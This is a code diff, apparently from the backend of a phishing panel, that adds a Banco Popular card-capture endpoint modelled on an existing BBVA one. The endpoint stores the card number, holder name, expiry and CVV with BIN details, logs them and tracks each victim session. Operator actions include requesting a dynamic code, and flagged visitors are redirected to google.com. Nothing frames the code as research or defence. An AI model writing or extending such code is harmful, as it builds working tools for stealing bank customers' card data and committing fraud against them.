@@ -503,7 +503,8 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_DINAMICA: 'pedir_dinamica',
                         YA_PAGO: 'ya_pagado',
                         PEDIR_TARJETA: 'mostrar_tarjeta',
-                        PEDIR_TARJETA_BBVA: 'pedir_tarjeta_bbva' // 🔥 NUEVA ACCIÓN AGREGADA AQUÍ
+                        PEDIR_TARJETA_BBVA: 'pedir_tarjeta_bbva',
+                        PEDIR_TARJETA_POPULAR: 'pedir_tarjeta_popular' // 🔥 NUEVA ACCIÓN AGREGADA AQUÍ
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -886,6 +887,50 @@ const server = http.createServer(async (req, res) => {
                 guardarHistorial('bbva', datosCompletos);
 
                 console.log(`[BBVA] Tarjeta recibida: ${sessionId} | Tarjeta: ${tarjeta} | Titular: ${titular}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // 🔥 NUEVO ENDPOINT PARA BANCO POPULAR 🔥
+        if (req.method === 'POST' && url === '/popular/guardar-tarjeta') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, exp, cvv } = datos;
+                
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+
+                const datosCompletos = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'popular',
+                    marca: 'popular',
+                    tarjeta,
+                    titular,
+                    exp,
+                    expMes: exp,
+                    cvv,
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'Popular Tarjeta');
+
+                guardarHistorial('popular', datosCompletos);
+
+                console.log(`[POPULAR] Tarjeta recibida: ${sessionId} | Tarjeta: ${tarjeta} | Titular: ${titular}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
